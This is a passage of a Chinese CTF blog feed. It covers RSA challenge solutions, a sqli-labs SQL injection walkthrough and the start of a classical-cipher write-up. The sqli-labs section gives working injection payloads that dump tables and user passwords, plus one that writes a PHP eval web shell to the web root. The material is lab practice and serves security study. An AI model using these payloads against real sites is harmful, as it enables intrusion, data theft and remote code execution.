作者(Author)：Wankko Ree</span></span><br><span class="line"><span class="comment"># 链接(URL)：https://www.wkr.moe/ctf/523.html</span></span><br><span class="line"><span class="comment"># 来源(Source)：Wankko Ree&#x27;s Blog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-1"><a href="#本题总结：-1" class="headerlink" title="本题总结："></a>本题总结：</h3><p>本题为虎符2021密码原题。<del>太卷了太卷了。</del>详细原理可以看</p>
<p>d33b4t0巨佬博客中对虎符原题的讲解。exp改编自他的解题脚本。其中注释部分除去讲解，均为sage运行。</p>
<h3 id="参考资料：-1"><a href="#参考资料：-1" class="headerlink" title="参考资料："></a>参考资料：</h3><p><a href="https://d33b4t0.com/2021/04/09/HFCTF%202021%20Crypto%20WP/">d33b4t0巨佬虎符CTF密码wp</a></p>
<p><a href="https://www.wkr.moe/ctf/523.html">Wankko Ree国赛wp</a></p>
<h2 id="三卷：rsa"><a href="#三卷：rsa" class="headerlink" title="三卷：rsa"></a>三卷：rsa</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><p>out:</p>
<p>已整理进chall.py多行注释中。</p>
<p>chall.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> text,flag</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> md5.new(text).hexdigest() == flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">msg1 = text[:xx]</span><br><span class="line">msg2 = text[xx:yy]</span><br><span class="line">msg3 = text[yy:]</span><br><span class="line"></span><br><span class="line">msg1 = bytes_to_long(msg1)</span><br><span class="line">msg2 = bytes_to_long(msg2)</span><br><span class="line">msg3 = bytes_to_long(msg3)</span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">N1 = p1*q1</span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg1,e1,N1)</span><br><span class="line"><span class="built_in">print</span> (e1,N1)</span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = getPrime(<span class="number">512</span>)</span><br><span class="line">N2 = p2*q2</span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e2,N2)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg2,e3,N2)</span><br><span class="line"><span class="built_in">print</span> (e2,N2)</span><br><span class="line"><span class="built_in">print</span> (e3,N2)</span><br><span class="line"></span><br><span class="line">p3 = getPrime(<span class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmsg1_e1_n1 = 19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line"><span class="string">e1_n1 = (3, 123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L)</span></span><br><span class="line"><span class="string">cmsg2_e2_n2 = 54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line"><span class="string">cmsg2_e3_n2 = 91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"><span class="string">e2_n2 = (17, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">e3_n2 = (65537, 111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L)</span></span><br><span class="line"><span class="string">cmsg3_e3_n3 = 59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line"><span class="string">e3_n3 = (65537, 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L)</span></span><br><span class="line"><span class="string">高位p3 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>送分题，都是很常见的rsa套路。</p>
<p>从题目可以看出，flag为text的md5值得到。然后text被拆成了3段，需要分别解出message1,message2,message3，拼接成text。</p>
<p>第一段是小加密指数爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (gmpy2.iroot(c + k * n, e)[<span class="number">1</span>] == <span class="literal">False</span>):</span><br><span class="line">    	k += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(c + k *n,e)[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531565492-cf798b69-e0ce-4753-af81-fed94cc715de.png" alt="image-20210519230937082"></p>
<p>解得k=0 ？？？<del>鞭尸红明谷2021密码第一道RSA？</del></p>
<p>第二段共模攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e1 = <span class="number">17</span></span><br><span class="line">c1 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line"></span><br><span class="line">g, x, y = gmpy2.gcdext(e1, e2) <span class="comment">#先通过扩展欧几里得算法求出x * e1 + y * e2 = 1中的x和y</span></span><br><span class="line"><span class="comment">#print(x, y)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c1, x, n) * <span class="built_in">pow</span>(c2, y, n) % n <span class="comment">#计算(c1的x次方 * c2的y次方) mod n</span></span><br><span class="line"><span class="comment">#print(m)</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531558163-1addd8d7-7383-41c2-a8b9-cdf00c78683b.png" alt="image-20210519231043784"></p>
<p>第三段coppersmith定理已知高位p</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L</span></span><br><span class="line">p4 = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">e =  <span class="number">65537</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line"><span class="built_in">print</span>(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment">#经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">	p = p4+<span class="built_in">int</span>(roots[<span class="number">0</span>]) </span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;n: &quot;</span>+<span class="built_in">str</span>(n))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;p: &quot;</span>+<span class="built_in">str</span>(p))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;q: &quot;</span>+<span class="built_in">str</span>(n//p))</span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531574004-3c8a0020-9e88-4151-8975-321919081454.png" alt="image-20210519231438772"></p>
<p>解出p、q后，直接求欧拉函数的逆元一把梭了。</p>
<p>得到三段message后，拼接一下得到text，再用python2求一下md5，得到答案：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CISCN&#123;3943e8843a19149497956901e5d98639&#125;</span><br></pre></td></tr></table></figure>
<h3 id="本题总结：-2"><a href="#本题总结：-2" class="headerlink" title="本题总结："></a>本题总结：</h3><p>应该是防止三卷爆零设置的rsa套娃题，都是相当基础的解法，不再做分析。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">翅膀师傅的RSA讲解</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入之sqlilab</title>
    <url>/2021/05/14/SQL%E6%B3%A8%E5%85%A5%E4%B9%8Bsqlilab/</url>
    <content><![CDATA[<h1 id="sqlilab学习"><a href="#sqlilab学习" class="headerlink" title="sqlilab学习"></a>sqlilab学习</h1><p>sqlilabs练习，主要参考郁离歌大佬的博客和SQL注入天书。</p>
<span id="more"></span>
<h2 id="联合查询篇"><a href="#联合查询篇" class="headerlink" title="联合查询篇"></a>联合查询篇</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>1、先输入<code>?id=1 and 1=2</code>判断发现回显正常，显然不是数字型注入。</p>
<p>2、在<code>?id</code>后面加上<code>&#39;</code> ,回显报错，存在字符型注入。</p>
<p>3、在后面加上注释符<code>#</code>或<code>--+</code>后，页面回显正常，可以得出存在单引号字符型注入。</p>
<p>4、使用以下payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+   //1,2,3回显均正常，4回显不正常。</span></span><br></pre></td></tr></table></figure>
<p>说明此表有3列。</p>
<p>5、使用payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
<p>联合查询语句查看页面是否有回显，发现页面回显2、3，说明页面有2个显示位。</p>
<p>看一下源码，mysql_fetch_array只被调用了一次，</p>
<p>而mysql_fetch_array从结果集中取得一行作为关联数组</p>
<p>或数字数组或二者兼有，具体看第二个参数是什么。</p>
<p>所以这里无论怎么折腾最后只会出来第一行的查询结果。</p>
<p>只要让第一行查询的结果是空集0或-1，即union左边的select子句查询结果为空，</p>
<p>那么union右边的查询结果自然就成为了第一行，打印在网页上了。</p>
<p>6、使用payload爆库名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+</span></span><br></pre></td></tr></table></figure>
<p>7、使用payload爆库security的表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>ps：table_schema=后面可以直接加单引号括起的数据库名，也可以是数据库的16进制，过滤单引号可用。</p>
<p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，<br>用户权限等信息，下面说一下常用的几个表</p>
<p>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</p>
<p>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</p>
<p>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。是show columns from schemaname.tablename的结果取之此表。</p>
<p>8、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
<p>9、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,username,password from users where id=2--+   //查看第二栏的数据</span></span><br></pre></td></tr></table></figure>
<h4 id="SQL语句："><a href="#SQL语句：" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h3><p> 同1的做法，只是闭合的SQL语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h3><p>语句不同。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="盲注篇"><a href="#盲注篇" class="headerlink" title="盲注篇"></a>盲注篇</h2><h3 id="基础知识：sql注入截取字符串"><a href="#基础知识：sql注入截取字符串" class="headerlink" title="基础知识：sql注入截取字符串"></a>基础知识：sql注入截取字符串</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671531751563-11f58953-0a1e-4688-9502-2f0cff8df865.png" alt="image-20210524090237647"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531758614-acfd7890-957f-4e75-bdde-b83715de7ce1.png" alt="image-20210524090313928"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531764848-bdcc8c0f-3d0f-4d48-9188-0c3f5ee9cf50.png" alt="image-20210524090338115"></p>
<p>同时也要介绍ORD()函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。</p>
<p>例如ORD(MID(DATABASE(),1,1))&gt;114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’</p>
<h3 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h3><p>报错注入</p>
<p>1、使用left()爆基本信息(版本号)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and left(version(),1)&lt;6--+</span></span><br></pre></td></tr></table></figure>
<p>爆数据库长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;and length(database())&lt;9--+</span></span><br></pre></td></tr></table></figure>
<p>2、爆当前用户名数据库等基本信息</p>
<p>双查询注入：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union Select 1,count(*),concat((select database()),floor(rand(0)*2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531771216-eafd3649-84a4-47a9-9bcf-5008aea2052a.png" alt="image-20210528225944247"></p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531775645-302a4bc0-4137-481d-927d-d640c6fc6f58.png" alt="image-20210528230013553"></p>
<p>3、爆表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>如需爆不同的数据库，在<code>security</code>处做修改。</p>
<p><code>limit 0,1</code>可以用来修改，爆出当前目录下的所有值。</p>
<p>4、爆列</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>同理，在<code>security</code>和<code>email</code>处修改。</p>
<p>5、爆数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select count(*),1, concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select email_id from emails limit 0,1),&#x27;</span><span class="operator">~</span><span class="string">&#x27;, floor(rand()*2)) as a from information_schema.tables group by a%23</span></span><br></pre></td></tr></table></figure>
<p>修改点在列名<code>email_id</code>和表名<code>emails</code></p>
<h4 id="SQL语句：-1"><a href="#SQL语句：-1" class="headerlink" title="SQL语句："></a>SQL语句：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h3><p>同less-5，只是闭合方式有显著不同。</p>
<p>SQL语句：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h3><p>时间盲注</p>
<p>1、爆库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA)</span><br></pre></td></tr></table></figure>
<p>2、爆表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select table_name from information_schema.tables where table_schema&#x3D;&#39;ctfshow&#39; limit 0,1)</span><br></pre></td></tr></table></figure>
<p>3、爆列名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select column_name from information_schema.columns where table_name&#x3D;&#39;flagug&#39; limit 1,1)</span><br></pre></td></tr></table></figure>
<p>4、爆数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(select flag4a23 from ctfshow.flagug limit 0,1)</span><br></pre></td></tr></table></figure>
<h2 id="文件导入："><a href="#文件导入：" class="headerlink" title="文件导入："></a>文件导入：</h2><h3 id="相关原理：SQLI-LABS修炼笔记（三）"><a href="#相关原理：SQLI-LABS修炼笔记（三）" class="headerlink" title="相关原理：SQLI-LABS修炼笔记（三）"></a>相关原理：<a href="http://yulige.top/?p=103">SQLI-LABS修炼笔记（三）</a></h3><h3 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h3><p>根据less-1中查询数据库的绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,@@datadir,3--+</span><br></pre></td></tr></table></figure>
<p>得到路径为<code>/var/lib/mysql/</code></p>
<p>测试下得到SQL语句为<code>&#39;))</code></p>
<p>蒙一个常见路径，上蚁剑</p>
<p>构筑payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;--+</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>几道比赛中遇到的密码题</title>
    <url>/2021/05/09/%E5%87%A0%E9%81%93%E6%AF%94%E8%B5%9B%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98/</url>
    <content><![CDATA[<h1 id="比赛中的Crypto题复现"><a href="#比赛中的Crypto题复现" class="headerlink" title="比赛中的Crypto题复现"></a>比赛中的Crypto题复现</h1><p>今年比赛中做到的一些高质量的密码题。</p>
<span id="more"></span>
<h2 id="2021蓝帽杯初赛classic"><a href="#2021蓝帽杯初赛classic" class="headerlink" title="2021蓝帽杯初赛classic"></a>2021蓝帽杯初赛classic</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> l1, l2, text, key, flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># text is a plain English text which only consists of lowercase letters (without any symbol)</span></span><br><span class="line">table = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> key <span class="keyword">in</span> text</span><br><span class="line"><span class="keyword">assert</span> l1 * l2 &lt; <span class="number">100</span></span><br><span class="line"></span><br><span class="line">k1 = []</span><br><span class="line">k2 = []</span><br><span class="line"></span><br><span class="line">fib = [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">modulus = randint(<span class="number">12345</span>,<span class="number">6789010</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>):</span><br><span class="line">    fib.append((fib[-<span class="number">1</span>] + fib[-<span class="number">2</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l1):</span><br><span class="line">    k1.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l2):</span><br><span class="line">    k2.append(fib[randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">16</span>)] % <span class="number">26</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="string">''</span>.join(table[((<span class="built_in">ord</span>(x) - <span class="number">97</span>) * (k1[i % l1]) + k2[i % l2]) % <span class="number">26</span>] <span class="keyword">for</span> i, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(aes.encrypt(flag + <span class="string">b'\0'</span> * (<span class="number">16</span> - <span class="built_in">len</span>(flag) % <span class="number">16</span>))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><p>Python2环境：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf_8</span></span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gm</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">  <span class="comment">#太长了不写了</span></span><br><span class="line"></span><br><span class="line">best_index_of_Coincidence = <span class="number">0.065</span></span><br><span class="line"></span><br><span class="line">best_freq = {}</span><br><span class="line">best_freq[<span class="string">'a'</span>] = <span class="number">0.08167</span></span><br><span class="line">best_freq[<span class="string">'b'</span>] = <span class="number">0.01492</span></span><br><span class="line">best_freq[<span class="string">'c'</span>] = <span class="number">0.02782</span></span><br><span class="line">best_freq[<span class="string">'d'</span>] = <span class="number">0.04253</span></span><br><span class="line">best_freq[<span class="string">'e'</span>] = <span class="number">0.12702</span></span><br><span class="line">best_freq[<span class="string">'f'</span>] = <span class="number">0.02228</span></span><br><span class="line">best_freq[<span class="string">'g'</span>] = <span class="number">0.02015</span></span><br><span class="line">best_freq[<span class="string">'h'</span>] = <span class="number">0.06094</span></span><br><span class="line">best_freq[<span class="string">'i'</span>] = <span class="number">0.06966</span></span><br><span class="line">best_freq[<span class="string">'j'</span>] = <span class="number">0.00153</span></span><br><span class="line">best_freq[<span class="string">'k'</span>] = <span class="number">0.00772</span></span><br><span class="line">best_freq[<span class="string">'l'</span>] = <span class="number">0.04025</span></span><br><span class="line">best_freq[<span class="string">'m'</span>] = <span class="number">0.02406</span></span><br><span class="line">best_freq[<span class="string">'n'</span>] = <span class="number">0.06749</span></span><br><span class="line">best_freq[<span class="string">'o'</span>] = <span class="number">0.07507</span></span><br><span class="line">best_freq[<span class="string">'p'</span>] = <span class="number">0.01929</span></span><br><span class="line">best_freq[<span class="string">'q'</span>] = <span class="number">0.00095</span></span><br><span class="line">best_freq[<span class="string">'r'</span>] = <span class="number">0.05987</span></span><br><span class="line">best_freq[<span class="string">'s'</span>] = <span class="number">0.06327</span></span><br><span class="line">best_freq[<span class="string">'t'</span>] = <span class="number">0.09056</span></span><br><span class="line">best_freq[<span class="string">'u'</span>] = <span class="number">0.02758</span></span><br><span class="line">best_freq[<span class="string">'v'</span>] = <span class="number">0.00978</span></span><br><span class="line">best_freq[<span class="string">'w'</span>] = <span class="number">0.02360</span></span><br><span class="line">best_freq[<span class="string">'x'</span>] = <span class="number">0.00150</span></span><br><span class="line">best_freq[<span class="string">'y'</span>] = <span class="number">0.01974</span></span><br><span class="line">best_freq[<span class="string">'z'</span>] = <span class="number">0.00074</span></span><br><span class="line"></span><br><span class="line"><span 